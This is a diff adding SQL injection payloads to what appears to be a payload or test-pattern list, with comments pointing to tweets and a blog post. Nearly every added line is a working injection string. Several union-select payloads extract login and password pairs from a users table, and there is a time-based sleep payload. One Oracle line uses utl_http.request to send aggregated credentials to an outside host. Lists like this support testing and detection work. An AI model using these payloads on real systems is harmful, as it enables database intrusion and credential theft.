@@ -351,3 +351,24 @@ true is not unknown for update union select table_name from information_schema.t
 '-(-1 or -1) and 1=0 union
 '-(-(1) or -1) and 1=0 union
 '-((1) or -1) and 1=0 union
+
+# https://twitter.com/dsrbr/status/342132003270959104
+-1 union select null, listagg(login || ':' || pass,', ') within group (order by login) from users;
+-1 union select null, xmlagg(xmlelement("user",login || ':' || pass).getStringVal() from users;
+-1 union select null, stragg(login || ':' || pass ||', ') from users;
+
+-1 union select listagg(login || ':' || pass,', ') within group (order by login) from users;
+
+# http://samincube.blogspot.ru/2013/06/time-based-sqli-on-google-coupon.html
+1'=sleep(1)='1
+
+# https://twitter.com/dsrbr/status/343017094926962691
+1 and select (utl_http.request('http://client9.com/') || select listagg(login || chr(58) || pass || ', ') within group  (order by login)  from dual) is not null;
+
+# https://twitter.com/dsrbr/status/341228356936814592
+-1 union select top 1 null, lead(pass, 0) over (order by pass) from users;
+
+# https://twitter.com/dsrbr/status/340018970054766592
+-1 union select null, array_to_json(array_agg(users))::text from users limit 1;
+1 and (select array_to_json(array_agg(users))::text::bool from users limit 1;
+
